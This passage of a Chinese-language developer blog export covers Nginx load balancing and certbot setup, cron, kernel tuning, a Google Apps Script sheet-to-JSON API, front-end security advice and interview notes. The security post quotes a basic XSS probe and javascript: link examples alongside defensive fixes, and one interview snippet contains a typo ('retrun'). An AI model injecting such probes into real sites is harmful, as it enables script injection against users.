去定時確認後端伺服器是否安好。</p><ul><li>least_conn 選擇最少連線數</li><li>least_time 回應時間</li><li>weight 倍數</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">upstream myapp1 &#123;</span><br><span class="line">    server srv1.example.com weight=3;</span><br><span class="line">    server srv2.example.com;</span><br><span class="line">    server srv3.example.com;</span><br><span class="line">    least_conn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">      location / &#123;</span><br><span class="line">            proxy_pass http://myapp1;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Nginx-https-設定"><a href="#Nginx-https-設定" class="headerlink" title="Nginx https 設定"></a>Nginx https 設定</h3><p>https 可以使用免費的 Let’s Encrypt，在 https 安裝上推薦使用<a href="https://certbot.eff.org/">憑證機器人</a> 自動更新 Let’s Encrypt 憑證</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> certbot --nginx -d test.domain.com</span><br><span class="line"><span class="built_in">sudo</span> certbot delete --cert-name test.domain.com</span><br><span class="line"><span class="built_in">sudo</span> certbot renew --dry-run</span><br></pre></td></tr></table></figure><p>執行指令後在檔案會看到 <code># managed by Certbot</code> 註解，代表這部分設置就不需要我們維護，<a href="https://www.digitalocean.com/community/tutorials/how-to-secure-nginx-with-let-s-encrypt-on-ubuntu-16-04">Digital Ocean 提供了很詳盡的教學</a>，非常推薦。</p><p>接著寫好想要執行的 <code>test.sh</code> 檔並設定 Linux 排程定時更新 SSL 憑證，記得將檔案改好權限 <code>chmod +x test.sh</code>，下面示範會產生資料夾:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">DIR=`<span class="built_in">date</span> +%D`</span><br><span class="line">DEST=~/test/<span class="variable">$DIR</span></span><br><span class="line"><span class="built_in">mkdir</span> <span class="variable">$DEST</span></span><br></pre></td></tr></table></figure><p>自訂的排程時間則可以使用 <a href="https://www.digitalocean.com/community/tutorials/how-to-use-cron-to-automate-tasks-on-a-vps">crontab</a>，使用 <code>crontab -e</code>進行編輯，透過分鐘、小時、日、月、星期幾來進行週期設定。</p><ul><li>譬如每個星期二的 4:00am 就可以寫成 <code>0 4 * * 2 ~/test.sh</code></li><li>也可以使用縮寫 <code>@daily ~/test.sh</code></li></ul><p>相關縮寫如下：</p><ul><li>@hourly <code>0 * * * *</code></li><li>@daily <code>0 0 * * *</code></li><li>@weekly <code>0 0 * * 0</code></li><li>@monthly <code>0 0 1 * *</code></li><li>@yearly <code>0 0 1 1 *</code></li></ul><p>防呆可以先用下面這個網站試寫:<br><a href="https://crontab.guru/">https://crontab.guru/</a></p><h2 id="Nginx-效能優化設定"><a href="#Nginx-效能優化設定" class="headerlink" title="Nginx 效能優化設定"></a>Nginx 效能優化設定</h2><p>Linux 設定檔在 <code>/etc/nginx</code>，除了 epoll 可以從機制上影響效能外，也能從系統<a href="http://nginx.org/en/docs/ngx_core_module.html">核心的設定</a>優化效能。</p><ul><li>worker_processes 就是配合主機核心數，若是 4 核心就可以設置 <code>worker_processes 4</code></li><li>worker_rlimit_nofile 是可以開啟的檔案數量，像我以前公司伺服器就有需要提供圖磚的快取，設定大量的開啟檔案數量可以說是必須</li><li>快取，在 Nginx 也有提供 proxy_cache_path 的快取設定</li><li>Gzip 壓縮，這個在很多地方都可以啟用，不一定需要在 Nginx 開啟</li><li>client_max_body_size 限制檔案上傳大小</li></ul><p>Connections 相關</p><ul><li>keepalive_requests: 預設值 100 可以邊壓測邊調整</li><li>keepalive_timeout: 多久要切掉</li><li>反向代理的 <a href="https://nginx.org/en/docs/http/ngx_http_upstream_module.html?&_ga=2.54364971.2046281064.1594341677-1932426211.1594341677#keepalive">keepalive</a>，記得設定 proxy_http_version 1.1; proxy_set_header Connection “”;</li></ul><p>加上相關限制</p><ul><li><a href="https://nginx.org/en/docs/http/ngx_http_limit_conn_module.html?&_ga=2.92243737.2046281064.1594341677-1932426211.1594341677#limit_conn">limit_conn</a> 譬如某些路由很佔頻寬就可以直接限制，不要影響其他快速的服務</li><li>limit_rate 限速</li><li>max_conns 如果 upstream 是比較弱的機台就建議設定一下</li></ul><p>如果有需要用到 websocket，設定會不太一樣，參考<a href="https://www.nginx.com/blog/websocket-nginx">官網文件</a>需要配置如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxy_http_version 1.1;</span><br><span class="line">proxy_set_header Upgrade <span class="variable">$http_upgrade</span>;</span><br><span class="line">proxy_set_header Connection <span class="string">&quot;Upgrade&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Nginx-Epoll"><a href="#Nginx-Epoll" class="headerlink" title="Nginx Epoll"></a>Nginx Epoll</h3><p>Nginx 在 Linux 的 IO 機制上有支援 epoll，所以在靜態網頁的效能上遠超過使用 select 機制的 apache，還有其他支援的機制可以參考<a href="http://nginx.org/en/docs/events.html">官方文件</a>。</p><ul><li>Apache Select (blocking)：監考老師問學生，隨堂考試寫完沒，收集足夠後送批改。同時太多學生時，會需要等學生回覆，上限預設 1024。</li><li>Nginx Epoll (non-blocking)：老師不再問學生，學生完成後放講桌，收集足夠後送批改。所以伺服器端一定會有回覆，但不一定會有資料 (待批改清單)，可能因為 timeout 回覆已過號請重新領取號碼牌，算是解決 C10K 的一種方式。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">events &#123;</span><br><span class="line">use epoll;</span><br><span class="line">worker_connections 1024;</span><br><span class="line">multi_accept on;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Linux-系統核心設定"><a href="#Linux-系統核心設定" class="headerlink" title="Linux 系統核心設定"></a>Linux 系統核心設定</h3><p>主要是編輯這個檔案 &#x2F;etc&#x2F;sysctl.conf</p><ul><li>sys.fs.file-max 最大開檔上限 <code>sysctl -w fs.file-max=50000</code> (可以暫時測試重開機後會消失)</li><li>net.core.somaxconn: 能被 nginx queue 接受的最大連線數，可以設定成 512，超過還需要設定 listen 的 backlog 參數，因為除了 FreeBSD, DragonFly BSD, macOS 其他預設值是 511</li><li>net.core.netdev_max_backlog: 網路卡的 backlog，加大會增加效能，但不了解網路卡的極限就容易出現錯誤 Orz</li><li>nofile 也跟開檔數有關會在 &#x2F;etc&#x2F;security&#x2F;limits.conf</li></ul><p>Linux 底下的編輯器建議使用 nano，相對簡單，使用時就是使用指令加檔名 <code>nano test.conf</code>，若是要修改權限外的檔案則要 <code>sudo nano test.conf</code> ，常見的如下，vi 和 vim 有區分指令模式跟輸入模式，操作概念較為複雜:</p><ul><li>vi</li><li>vim</li><li>nano</li></ul>]]></content>
      
      
      <categories>
          
          <category> 雲端服務 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 雲端服務 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google 試算表實作簡易資料庫</title>
      <link href="/2019/03/28/js-google-sheet-db/"/>
      <url>/2019/03/28/js-google-sheet-db/</url>
      
        <content type="html"><![CDATA[<p>這篇文章會簡介怎麼運用 Google Sheet, App script, Visualization API 實作簡易資料庫，只需要將規則處理清楚，做為比較常用來讀取使用的簡易的資料庫是非常實用。</p><h2 id="Google-表單與試算表如何成為資料庫"><a href="#Google-表單與試算表如何成為資料庫" class="headerlink" title="Google 表單與試算表如何成為資料庫"></a>Google 表單與試算表如何成為資料庫</h2><p>之前在新創公司服務，由於老闆時程超級趕，高手前同事也就想出了這樣的辦法，很厲害的也把 CRUD 的函式都寫好，我接手的時候就只要叫用即可，過了兩年，發現在要和非資訊領域的人合作時，這也是個不錯的解決方案，Google 表單做到了可以防呆輸入，試算表則做到了同步功能，也可以動態額外的新增欄位，這個 Combo 技能如果在不要求效能，或是並沒有頻繁更新的情況下，覺得真的很方便，而且資料還可以同時很多人編輯。</p><h2 id="Visualization-API"><a href="#Visualization-API" class="headerlink" title="Visualization API"></a>Visualization API</h2><p>這篇文章有<a href="https://www.wfublog.com/2016/11/google-4-sql.html">簡易的介紹</a>，主要就是透過更方便的 API 來操作 google 試算表，優點是方便好用，缺點就是別人知道了也可以任意改動我們的資料表了。</p><p>官方的參考文件:<br><a href="https://developers.google.com/chart/interactive/docs/reference">https://developers.google.com/chart/interactive/docs/reference</a></p><h2 id="Google-App-Script"><a href="#Google-App-Script" class="headerlink" title="Google App Script"></a>Google App Script</h2><p>另外一個比較安全一點的方法就是，表單不開放，但透過 App script 去開出 API，缺點就是有些邏輯可能要稍微防呆一下，只用官方的 function 並無法完全符合需求且防掰。</p><p>網路上有很多比較複雜的範例，底下就實做了一個簡單方法，主要是去把表單裡的資料全部抓出來，並組成我們要的 JSON 檔。</p><p>假設試算表中第一列為資料欄位名稱，第二列才開始是資料，我們可以先跑迴圈把所有的欄位抓出來，再利用欄位的數量去把每一列的資料一一撈出並映射到物件中，最後把物件放進陣列就完成了。</p><p>官方的參考文件:<br><a href="https://developers.google.com/apps-script/">https://developers.google.com/apps-script/</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getRows</span>(<span class="params">sheet</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> jo = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> dataArray = [];</span><br><span class="line">  <span class="keyword">var</span> result = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> labels = [];</span><br><span class="line">  <span class="keyword">var</span> data = sheet.<span class="title function_">getDataRange</span>().<span class="title function_">getValues</span>();</span><br><span class="line">  <span class="keyword">var</span> rows = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i <span class="keyword">in</span> data) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!!data[<span class="number">0</span>][i]) &#123;</span><br><span class="line">      labels.<span class="title function_">push</span>(data[<span class="number">0</span>][i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// collecting data from 2nd Row , 1st column to last row and last column</span></span><br><span class="line">  rows = sheet</span><br><span class="line">    .<span class="title function_">getRange</span>(<span class="number">2</span>, <span class="number">1</span>, sheet.<span class="title function_">getLastRow</span>() - <span class="number">1</span>, sheet.<span class="title function_">getLastColumn</span>())</span><br><span class="line">    .<span class="title function_">getValues</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, l = rows.<span class="property">length</span>; i &lt; l; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> dataRow = rows[i];</span><br><span class="line">    <span class="keyword">var</span> record = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (j <span class="keyword">in</span> labels) &#123;</span><br><span class="line">      record[labels[j].<span class="title function_">toString</span>()] = dataRow[j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (record[labels[<span class="number">1</span>]]) &#123;</span><br><span class="line">      dataArray.<span class="title function_">push</span>(record);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  jo.<span class="property">results</span> = dataArray;</span><br><span class="line">  jo.<span class="property">status</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  result = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(jo);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">ContentService</span>.<span class="title function_">createTextOutput</span>(result).<span class="title function_">setMimeType</span>(</span><br><span class="line">    <span class="title class_">ContentService</span>.<span class="property">MimeType</span>.<span class="property">JSON</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Frontend </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端專案資訊安全</title>
      <link href="/2018/11/15/thinking-security/"/>
      <url>/2018/11/15/thinking-security/</url>
      
        <content type="html"><![CDATA[<p>資訊安全，是為了保護機密資訊及維持系統的穩定。而網站的資安會建議從幾個常見流程來處理</p><ol><li>網址安全查詢</li><li>輸入資料</li><li>API 溝通</li><li>登入流程</li></ol><h2 id="網址安全查詢"><a href="#網址安全查詢" class="headerlink" title="網址安全查詢"></a>網址安全查詢</h2><p>輸入網址時需注意 https 和網址解析的方式，也可以透過相關服務去查詢該網址是否安全。</p><h3 id="https-加密傳輸"><a href="#https-加密傳輸" class="headerlink" title="https 加密傳輸"></a>https 加密傳輸</h3><p>Chrome 會自動遮蔽沒有加密的連線，沒有 https 網站會被警告。</p><p>網站 https 如何取得? </p><ul><li>cloudflare: 提供 DNS 免費服務，此外還提供 CDN 快取的機制和 DDoS 預防，可以說是網頁安全的無腦第一步</li><li><a href="https://www.sslforfree.com/">sslforfree</a>: 想自己安裝的免費解決方案</li></ul><h3 id="網址安全解析"><a href="#網址安全解析" class="headerlink" title="網址安全解析"></a>網址安全解析</h3><p>網址解析時瀏覽器遇到 <code>#</code> 號時，<code>#</code> 後面會到 scrpit 中執行，預設會找該 id 的 element 並捲動到該位置。</p><p>舉例來說: <code>http://localhost:3000/#/test</code> 我們就可以透過 <code>window.location.hash</code> 得到 <code>/test</code>，可以使用 <code>onhashchange</code> 來監聽並做操作。</p><p><code>#</code> 號只對瀏覽器產生有效事件且會被執行。</p><p>如果壞人利用這個來做惡意操作怎麼辦? 當未來看到有特殊符號的網址就不要亂點，若縮網址和 QRcode 進行包裝就更需要謹慎了。</p><h2 id="網站-XSS"><a href="#網站-XSS" class="headerlink" title="網站 XSS"></a>網站 XSS</h2><p>XSS 發生在輸入資料的過程中被攻擊，反過來想就是輸入惡意程式碼進去，<code>&lt;script&gt;alert(0.0)&lt;/script&gt;</code> 這段程式碼會不會被執行?  </p><p>舉例來說，可以避免傳入 href 當成參數，可能會造成漏洞。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0);&quot;</span>&gt;</span>單擊此處什麼也不會發生<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(document.form.submit());&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:dangerous();&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;goToLink();&quot;</span>&gt;</span>點我<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">validateURL</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> parsed = <span class="keyword">new</span> <span class="title function_">URL</span>(url)</span><br><span class="line">  <span class="keyword">return</span> [<span class="string">&#x27;https:&#x27;</span>, <span class="string">&#x27;http:&#x27;</span>].<span class="title function_">includes</span>(parsed.<span class="property">protocol</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;a href=&#123;<span class="title function_">validateURL</span>(url) ? url : <span class="string">&#x27;&#x27;</span>&#125;&gt;<span class="title class_">Click</span> here!&lt;/a&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#123;attackerControlled&#125;</span>&gt;</span>Click here!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前端若使用 react，在使用 <code>dangerouslySetInnerHTML</code> 這類包含危險提示的時候都該注意一點，dangerouslySetInnerHTML 先用相關工具處理，避免直接 <code>this.myRef.current.innerHTML = attackerControlledValue;</code>。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> purify <span class="keyword">from</span> <span class="string">&quot;dompurify&quot;</span>;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">dangerouslySetInnerHTML</span>=<span class="string">&#123;&#123;</span> <span class="attr">__html:purify.sanitize</span>(<span class="attr">data</span>) &#125;&#125; /&gt;</span></span></span><br></pre></td></tr></table></figure><p>實作伺服器渲染過過程中，會需要把伺服器狀態重新給到前端的 store，這個時候這段就很有可能發生類似問題，可以做的是就是把 state 字串編碼再解碼。</p><h2 id="API-溝通"><a href="#API-溝通" class="headerlink" title="API 溝通"></a>API 溝通</h2><p>資料傳輸的過程中會不會發生問題，瀏覽器很雞婆都會發 OPTIONS 方法送出請求到另一個網域，去確認是否跨網域以及方法是否可用，也就是我們常常聽到的 CORS 問題，那 API 會不會被機器人一直試? 就是看這一關有沒有擋，擋了之後有沒有可能在 client 端被偽裝，如果不是專業的，要怎麼預防，express 有<a href="https://expressjs.com/zh-tw/advanced/best-practice-security.html">相關說明及建議</a>:</p><ul><li>Content-Security-Policy 標頭，以防範跨網站 Scripting 攻擊和其他跨網站注入。</li><li>移除 X-Powered-By 標頭。</li><li>Public Key Pinning 標頭，來防範使用偽造憑證的中間人攻擊。</li><li>Strict-Transport-Security 標頭，以施行安全的 (HTTP over SSL&#x2F;TLS) 伺服器連線。</li><li>X-Download-Options（適用於 IE8+）。</li><li>Cache-Control 和 Pragma 標頭，以停用用戶端快取。</li><li>X-Content-Type-Options，以阻止瀏覽器對脫離所宣告內容類型的回應進行 MIME 探查。</li><li>X-Frame-Options 標頭，以提供 clickjacking 保護。</li><li>X-XSS-Protection，以便在最新的 Web 瀏覽器中啟用跨網站 Scripting (XSS) 過濾器。</li></ul><p>交換資料再加上鑰匙，也就是伺服器端可以產生伺服器的 cookies 或是短時效性的 token，client 端能做的就是把自己的資訊跟伺服器講，像是產生 <a href="https://github.com/Valve/fingerprintjs2">fingerprint</a>，這樣伺服器至少可以保證每次的請求都是當下這個環境來的，把這兩種訊息做結合判斷，應該可以擋掉部分偽裝的請求。</p><h2 id="登入流程的-Auth-和-Token-原理"><a href="#登入流程的-Auth-和-Token-原理" class="headerlink" title="登入流程的 Auth 和 Token 原理"></a>登入流程的 Auth 和 Token 原理</h2><p>cookies 的使用，一來可以辨認身分，二來也可以用來儲存狀態，最後就是因為會跟著請求回到伺服器，所以廣告業也可以用這樣的方式在目標對象按按鈕的時候得到相關資訊，那每次的無痕都會是一個新的環境，fingerprint 會不一樣，當然最快的絕對不是記錄環境，而是直接讓使用者按按鈕，把該打的東西一起傳回伺服器像是 facebook pixel，這樣下次就可以在臉書打到使用者了，最近因為 GDPR 的關係，很多東西變得比較嚴格，原則上只有自己的網域可以使用，那子網域怎麼辦，當然設計上沒有這麼死板，設定一下還是一樣可以使用的，畢竟是同個域名。</p><p>如果沒有實作 cookies? sessionStorage 和 localStorage 的組合技也是一個可以保持登入狀態的方式，token 就需要有交換機制，當然最好的也是配合儲存一下使用者的環境，架構如下圖，資料來源(<a href="https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/)%E3%80%82">https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/)。</a></p><img src="https://cdn.auth0.com/blog/refresh-token/diag2.png">]]></content>
      
      
      <categories>
          
          <category> Frontend </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 網站技術 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端面試心得 (2018/11)</title>
      <link href="/2018/11/12/thinking-interview/"/>
      <url>/2018/11/12/thinking-interview/</url>
      
        <content type="html"><![CDATA[<h2 id="職涯的下一步"><a href="#職涯的下一步" class="headerlink" title="職涯的下一步"></a>職涯的下一步</h2><p>最近兩份工作都在新創上班，回想當時會想進去众社企，是因為有著年輕厲害的同事們，尤其在行銷還有公共關係上(<a href="http://aces2016.thenewslens.com/aces/%E9%BB%83%E5%AD%9F%E6%B7%B3">連結 1</a>、<a href="https://vision.udn.com/vision/story/9745/1701902">連結 2</a>)，也因為前老闆交際圈的關係，不時會有外國人來實習，也有請像是 Dearbnb 的創辦人來分享，可惜的是在還沒來得及被影響到的情況下，普遍我們都被時間追著跑，追趕著接案的時程、上線的時程，後來共同創辦人決定離開出國進修、技術長也因為生涯規劃離開，接著是另外一位前端同事想停下工作休息一段時間也離職了，最後負責連 carry 大家坐我隔壁台大的學長也在尾牙後離開了。</p><p>再來是現在的公司，老闆是個佛心來著的教育家，人在北部但卻很神奇的把辦公室設在南部，但我也發現公司設立在南部的缺點，新創找人本來就不容易，加上如果又選在南部的話，相對大公司同樣的成本卻只能找來二流的人力。這樣不僅很可能會花很多時間在培養員工，而且在小團隊中，合作也會是最大的問題。問題在於本來每個人追求的就不相同、受訓練的背景不同、步調不同，可是我們卻像是需要一起划龍舟的隊友，在這一條像是小龍舟的新創公司中，需要努力朝向營利的目標前進，可是，當大家的目標沒有對齊，能力和步調沒有一致，這條船在運行上就很容易會有些意外發生。要推動大家自發性的把事情做好，真的不容易。</p><p>其實慢慢可以猜測或理解新創公司的流動率高的原因，到了新創也更體認到到如果員工是追求成長的，在看不到成長時就很容易出現想離開的念頭。不過最重要的事情對我而言是掌握住價值吧? 錢跟規定可以把人綁在座位上，但綁住了人，人也可以擺爛划手機、上班聊天打電動等等，難以產生創意和價值還有把工作做好的心，那，價值是什麼? 我認為這會是規劃職涯及選擇同事上的重要問題。所以這兩次面試都有問這樣的價值問題。</p><h2 id="KKstream-面試心得"><a href="#KKstream-面試心得" class="headerlink" title="KKstream 面試心得"></a>KKstream 面試心得</h2><p>結果: 感謝信，原因大概是自己表現出只是早上空著想說就順便參加(實際上也是 Orz)，然後對於不舒服的面試感可能?也很直接反應在回問的問題上，能力也沒達到他們對效能的要求。</p><p>KKstream，感覺是個一言堂，主管主觀意識過強，說話的感覺令人不太舒服，開頭說是 HR 找來的(感覺其他人都沒事先看過履歷就決定讓人選來談看看，也可能這次是我臨時約的關係。)，另外面試到一半有看到其中一位資淺同仁因為過敏脖子跟臉都超紅，而且一直在抓，我想說可能需要休息，但主管對那個女孩子消遣的說一句她酒喝多了。(也可能是感情真的很好可以公開在陌生人面前這樣講 @@)，所以光是上面這些感覺，早知道就直接早上空著好好準備 Oath 的面試了。</p><p>技術問題: 抓兩個 request 之後比較兩個陣列中的資料並抓出不同的部分，我的答案被砲說，可能沒有看出這題我想問什麼，他們是從效能面來看，主管的答覆是如果可以平行可以發出越多 request 越好，其實這個解釋也是有點問題的? 因為 js 是單線程的語言，所以這個回答也不夠精確，不過大致上的意思就是換個寫法就可以不用等第一個有答案後才送二個，能夠越”接近”多工越好。比較好的方法，答案也許?是 <code>Promise.all([])</code>，提供了一個同時發出請求的函式，缺點可能是如果有其中一個要等很久，其他也會等很久。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> _ <span class="keyword">from</span> <span class="string">&#x27;lodash&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://api.com/api1&#x27;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">res1</span>)=&gt;</span>&#123;</span><br><span class="line">  retrun res1.<span class="property">json</span>;</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">jsonFromAPI1</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="title function_">fetch</span>(<span class="string">&#x27;http://api.com/api2&#x27;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">res2</span>)=&gt;</span>&#123;</span><br><span class="line">    retrun res2.<span class="property">json</span>;</span><br><span class="line">  &#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">jsonFromAPI2</span>)=&gt;</span>&#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(_.<span class="title function_">intersection</span>(jsonFromAPI1, jsonFromAPI2));</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;) ;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="title function_">all</span>([</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="title function_">resolve</span>(<span class="number">1</span>), <span class="number">3000</span>)), <span class="comment">// 1</span></span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="title function_">resolve</span>(<span class="number">2</span>), <span class="number">2000</span>)), <span class="comment">// 2</span></span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="title function_">resolve</span>(<span class="number">3</span>), <span class="number">1000</span>)), <span class="comment">// 3</span></span><br><span class="line">]).<span class="title function_">then</span>(alert);</span><br></pre></td></tr></table></figure><p>印象比較深刻還有考了一個什麼時候要用 state，什麼時候要用 props，我按照自己的理解回答，大概講了一下<a href="https://linyencheng.github.io/2017/03/06/thinking-dataflow/?utm_source=link&utm_medium=article&utm_campaign=internal_link">資料流</a>、<a href="https://linyencheng.github.io/2017/05/18/thinking-component-state-and-props/?utm_source=link&utm_medium=article&utm_campaign=internal_link">狀態和性質的差異</a>，我會看是不是需要共用或是跟其他元件連動，結果不算正解 QQ 然後我如果沒有反問的話，他們也不會說出他們認為的正解，最後主管如同上列回答，在意的是渲染的效能問題。</p><p>我理解上。目前大部分時候渲染的效能影響都不大，我們回到底層上來看，如果操作的 element 不多，頂多幾百毫秒的問題，在中小企業，還是偏好維護好交接為主，沒有必要為了幾毫秒去把結構或直觀的邏輯弄複雜。</p><p>白板題，一個陣列前三大數字乘積，主要是考排序，老實說因為最近一年都是在趕工，越來越依賴 lodash 也就越少動腦，這次突然要手寫算法類的 code 還真的頭腦一片空白，後來用了比較呆的方法做出來了，下午又遇到同樣的坑，最大的問題在要一邊被砲一邊想回答，一邊又需要切換回到寫程式的狀態，算法問題又還沒有熟練到肌肉記憶或反射的程度，所以表現都很慘烈，比起前年去群暉挑戰的時候退化很多。</p><p>工作方面，有詢問 coding style，得到的答案是不重要，IDE 可以處理，但有些其實無法 lint 出來，像是變數宣告位置，函式建議只留一個 return 這種整體版面感受的小細節。另外文件產出只會有部分跟必要的，但對於品質會有要求，時程可以再談。(聽主管講話的態度跟語氣聽起來我會翻譯成，你就做到我滿意為止 QQ)</p><p>最後問的是這階段選擇工作、同事上最重要的問題，詢問這份工作上最大的成長或是這份工作帶來的價值，主管的回答是我工作十年了你參考也沒用(好不舒服 QQ)，然後直接不回答把問題丟給才剛來三個月的菜鳥(這顯示出可能是一位不願意分享的主管，而且出問題就丟給菜鳥@@)，菜鳥在主管面前給的答案是，我才來三個月，不過都有學到東西，而且跟前一份工作比這裡當然是有比較滿意才過來。</p><h2 id="Oath-面試心得"><a href="#Oath-面試心得" class="headerlink" title="Oath 面試心得"></a>Oath 